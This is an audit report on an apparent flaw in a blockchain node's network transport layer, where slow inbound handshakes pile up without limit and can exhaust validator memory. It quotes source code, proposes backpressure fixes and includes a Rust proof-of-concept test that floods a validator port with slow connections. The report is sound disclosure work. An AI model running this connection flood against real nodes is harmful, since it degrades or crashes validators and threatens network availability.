# Audit Report

## Title
Unbounded Connection Queue Buildup Due to Missing Backpressure in Transport Listener Stream

## Summary
The network transport layer's listener stream uses `map_ok` without backpressure, allowing unbounded accumulation of slow connection upgrade futures. An attacker can exhaust validator node memory by opening numerous slow connections that remain in the upgrade phase, bypassing the post-upgrade `inbound_connection_limit` protection.

## Finding Description

The vulnerability exists in the connection acceptance flow where the listener stream has `map_ok` applied without any backpressure mechanism: [1](#0-0) 

The `map_ok` combinator eagerly transforms incoming connections into upgrade futures without waiting for downstream consumption. These futures are then pushed to an unbounded `FuturesUnordered` collection: [2](#0-1) 

The critical issue is that `pending_inbound_connections` has no size limit, and the `futures::select!` loop will continuously accept new connections from the listener regardless of how many pending upgrades are already in progress.

The upgrade process can take up to 30 seconds per connection due to the timeout: [3](#0-2) 

Each upgrade involves:
1. Optional proxy protocol header reading
2. Noise cryptographic handshake 
3. Application protocol negotiation [4](#0-3) 

The existing `inbound_connection_limit` (default 100) only applies to **completed** connections, checked AFTER upgrade finishes: [5](#0-4) 

**Attack Scenario:**
1. Attacker opens TCP connections to a validator node at rate R per second
2. For each connection, attacker deliberately performs handshake slowly (sending bytes with delays)
3. Each connection times out after 30 seconds but new connections keep arriving
4. Steady-state: R Ã— 30 pending connections accumulate in `pending_inbound_connections`
5. If R = 50/sec, that's 1,500 pending connections with associated socket buffers, crypto state, and futures
6. Memory exhaustion occurs, potentially crashing the validator node

The TCP listener backlog (256 connections) only limits kernel-level queueing: [6](#0-5) 

Once accepted, connections are immediately wrapped in upgrade futures without any application-level limit.

## Impact Explanation

**Severity: Medium to High**

This vulnerability enables a resource exhaustion attack affecting validator availability:

- **Memory Exhaustion**: Unbounded growth of pending connection structures, socket buffers, and cryptographic state
- **Validator Node Slowdowns** (High Severity per bug bounty): As memory pressure increases, node performance degrades
- **Potential Total Network Unavailability** (Critical Severity): If enough validators are simultaneously attacked and crash due to OOM, network liveness is compromised
- **No Validator Privileges Required**: Any network peer can execute this attack

The attack breaks the "Resource Limits" invariant that all operations must respect computational and memory limits. Unlike the post-upgrade `inbound_connection_limit`, there is zero protection against pre-upgrade connection accumulation.

## Likelihood Explanation

**Likelihood: High**

- **Low Attack Complexity**: Opening TCP connections and performing slow handshakes requires minimal sophistication
- **No Authentication Required**: Attacker doesn't need to complete valid authentication to cause resource exhaustion
- **Sustained Attack Required**: Requires maintaining high connection rate (50-100/sec) for several minutes
- **Observable Metrics**: The `aptos_network_pending_connection_upgrades` metric tracks this, but no automatic mitigation exists

The attack is highly practical for motivated adversaries targeting validator nodes during critical network events.

## Recommendation

Implement bounded pending upgrade queue with backpressure:

**Option 1: Bounded Channel/Semaphore**
```rust
// In TransportHandler::new, add:
const MAX_PENDING_UPGRADES: usize = 256; // Or configurable
let upgrade_semaphore = Arc::new(Semaphore::new(MAX_PENDING_UPGRADES));

// In listen() loop, before pushing to pending_inbound_connections:
let permit = match upgrade_semaphore.clone().try_acquire_owned() {
    Ok(permit) => permit,
    Err(_) => {
        warn!("Max pending upgrades reached, dropping connection");
        counters::connections_rejected(&self.network_context, ConnectionOrigin::Inbound).inc();
        continue;
    }
};
// Attach permit to future so it's released on completion
```

**Option 2: Check Queue Size**
```rust
// In listen() loop at line 106-109:
inbound_connection = self.listener.select_next_some() => {
    if pending_inbound_connections.len() >= MAX_PENDING_UPGRADES {
        warn!("Max pending upgrades reached, dropping connection");
        counters::connections_rejected(&self.network_context, ConnectionOrigin::Inbound).inc();
        continue;
    }
    if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
        pending_inbound_connections.push(fut);
    }
},
```

**Option 3: Replace map_ok with buffer_unordered**
```rust
// In transport/mod.rs lines 619-629:
let inbounds = listener
    .map_ok(move |(fut_socket, addr)| {
        let fut_upgrade = upgrade_inbound(/* ... */);
        let fut_upgrade = timeout_io(time_service.clone(), TRANSPORT_TIMEOUT, fut_upgrade);
        (fut_upgrade, addr)
    })
    .buffer_unordered(MAX_PENDING_UPGRADES); // Provides automatic backpressure
```

Add configuration parameter `max_pending_connection_upgrades` to `NetworkConfig`.

## Proof of Concept

```rust
#[tokio::test]
async fn test_unbounded_pending_upgrades() {
    use tokio::net::TcpStream;
    use tokio::time::{sleep, Duration};
    
    // Setup: Start an Aptos validator node with network listening
    let validator_addr = "127.0.0.1:6180"; // Standard Aptos port
    
    // Attack: Open many connections that are slow during handshake
    let mut connections = vec![];
    for i in 0..2000 {
        let mut stream = TcpStream::connect(validator_addr).await.unwrap();
        
        // Send partial Noise handshake slowly to keep upgrade future alive
        // Each connection stays in pending_inbound_connections for ~30 seconds
        tokio::spawn(async move {
            // Send 1 byte every second to keep connection alive but upgrade slow
            for _ in 0..30 {
                let _ = stream.write_all(&[0x00]).await;
                sleep(Duration::from_secs(1)).await;
            }
        });
        
        connections.push(stream);
        
        if i % 100 == 0 {
            println!("Opened {} slow connections", i);
        }
        
        // Rate limit to 50 connections/sec
        sleep(Duration::from_millis(20)).await;
    }
    
    // After 30 seconds, pending_inbound_connections should have ~1500 entries
    // Check validator memory usage - it should show significant growth
    // Check metric: aptos_network_pending_connection_upgrades{direction="inbound"}
    
    sleep(Duration::from_secs(35)).await;
    
    // Validator node should show memory exhaustion symptoms:
    // - High memory usage from pending futures
    // - Degraded performance
    // - Potential OOM crash
}
```

**Notes:**
- The vulnerability is real and exploitable without any validator privileges
- The 30-second timeout per connection amplifies the attack impact
- Existing `inbound_connection_limit` does not protect against this attack vector
- Fix requires implementing backpressure at the transport layer before upgrade begins

### Citations

**File:** network/framework/src/transport/mod.rs (L40-41)
```rust
/// A timeout for the connection to open and complete all of the upgrade steps.
pub const TRANSPORT_TIMEOUT: Duration = Duration::from_secs(30);
```

**File:** network/framework/src/transport/mod.rs (L249-332)
```rust
async fn upgrade_inbound<T: TSocket>(
    ctxt: Arc<UpgradeContext>,
    fut_socket: impl Future<Output = io::Result<T>>,
    addr: NetworkAddress,
    proxy_protocol_enabled: bool,
) -> io::Result<Connection<NoiseStream<T>>> {
    let origin = ConnectionOrigin::Inbound;
    let mut socket = fut_socket.await?;

    // If we have proxy protocol enabled, process the event, otherwise skip it
    // TODO: This would make more sense to build this in at instantiation so we don't need to put the if statement here
    let addr = if proxy_protocol_enabled {
        proxy_protocol::read_header(&addr, &mut socket)
            .await
            .map_err(|err| {
                debug!(
                    network_address = addr,
                    error = %err,
                    "ProxyProtocol: Failed to read header: {}",
                    err
                );
                err
            })?
    } else {
        addr
    };

    // try authenticating via noise handshake
    let (mut socket, remote_peer_id, peer_role) =
        ctxt.noise.upgrade_inbound(socket).await.map_err(|err| {
            if err.should_security_log() {
                sample!(
                    SampleRate::Duration(Duration::from_secs(15)),
                    warn!(
                        SecurityEvent::NoiseHandshake,
                        NetworkSchema::new(&ctxt.noise.network_context)
                            .network_address(&addr)
                            .connection_origin(&origin),
                        error = %err,
                    )
                );
            }
            let err = io::Error::other(err);
            add_pp_addr(proxy_protocol_enabled, err, &addr)
        })?;
    let remote_pubkey = socket.get_remote_static();
    let addr = addr.append_prod_protos(remote_pubkey, HANDSHAKE_VERSION);

    // exchange HandshakeMsg
    let handshake_msg = HandshakeMsg {
        supported_protocols: ctxt.supported_protocols.clone(),
        chain_id: ctxt.chain_id,
        network_id: ctxt.network_id,
    };
    let remote_handshake = exchange_handshake(&handshake_msg, &mut socket)
        .await
        .map_err(|err| add_pp_addr(proxy_protocol_enabled, err, &addr))?;

    // try to negotiate common aptosnet version and supported application protocols
    let (messaging_protocol, application_protocols) = handshake_msg
        .perform_handshake(&remote_handshake)
        .map_err(|err| {
            let err = format!(
                "handshake negotiation with peer {} failed: {}",
                remote_peer_id.short_str(),
                err
            );
            add_pp_addr(proxy_protocol_enabled, io::Error::other(err), &addr)
        })?;

    // return successful connection
    Ok(Connection {
        socket,
        metadata: ConnectionMetadata::new(
            remote_peer_id,
            CONNECTION_ID_GENERATOR.next(),
            addr,
            origin,
            messaging_protocol,
            application_protocols,
            peer_role,
        ),
    })
}
```

**File:** network/framework/src/transport/mod.rs (L619-629)
```rust
        let inbounds = listener.map_ok(move |(fut_socket, addr)| {
            // inbound upgrade task
            let fut_upgrade = upgrade_inbound(
                ctxt.clone(),
                fut_socket,
                addr.clone(),
                enable_proxy_protocol,
            );
            let fut_upgrade = timeout_io(time_service.clone(), TRANSPORT_TIMEOUT, fut_upgrade);
            (fut_upgrade, addr)
        });
```

**File:** network/framework/src/peer_manager/transport.rs (L91-109)
```rust
        let mut pending_inbound_connections = FuturesUnordered::new();
        let mut pending_outbound_connections = FuturesUnordered::new();

        debug!(
            NetworkSchema::new(&self.network_context),
            "{} Incoming connections listener Task started", self.network_context
        );

        loop {
            futures::select! {
                dial_request = self.transport_reqs_rx.select_next_some() => {
                    if let Some(fut) = self.dial_peer(dial_request) {
                        pending_outbound_connections.push(fut);
                    }
                },
                inbound_connection = self.listener.select_next_some() => {
                    if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                        pending_inbound_connections.push(fut);
                    }
```

**File:** network/framework/src/peer_manager/mod.rs (L352-389)
```rust
        if conn.metadata.origin == ConnectionOrigin::Inbound {
            // Everything below here is meant for unknown peers only. The role comes from
            // the Noise handshake and if it's not `Unknown` then it is trusted.
            if conn.metadata.role == PeerRole::Unknown {
                // TODO: Keep track of somewhere else to not take this hit in case of DDoS
                // Count unknown inbound connections
                let unknown_inbound_conns = self
                    .active_peers
                    .iter()
                    .filter(|(peer_id, (metadata, _))| {
                        metadata.origin == ConnectionOrigin::Inbound
                            && trusted_peers
                                .get(peer_id)
                                .is_none_or(|peer| peer.role == PeerRole::Unknown)
                    })
                    .count();

                // Reject excessive inbound connections made by unknown peers
                // We control outbound connections with Connectivity manager before we even send them
                // and we must allow connections that already exist to pass through tie breaking.
                if !self
                    .active_peers
                    .contains_key(&conn.metadata.remote_peer_id)
                    && unknown_inbound_conns + 1 > self.inbound_connection_limit
                {
                    info!(
                        NetworkSchema::new(&self.network_context)
                            .connection_metadata_with_address(&conn.metadata),
                        "{} Connection rejected due to connection limit: {}",
                        self.network_context,
                        conn.metadata
                    );
                    counters::connections_rejected(&self.network_context, conn.metadata.origin)
                        .inc();
                    self.disconnect(conn);
                    return;
                }
            }
```

**File:** network/netcore/src/transport/tcp.rs (L127-127)
```rust
        let listener = socket.listen(256)?;
```
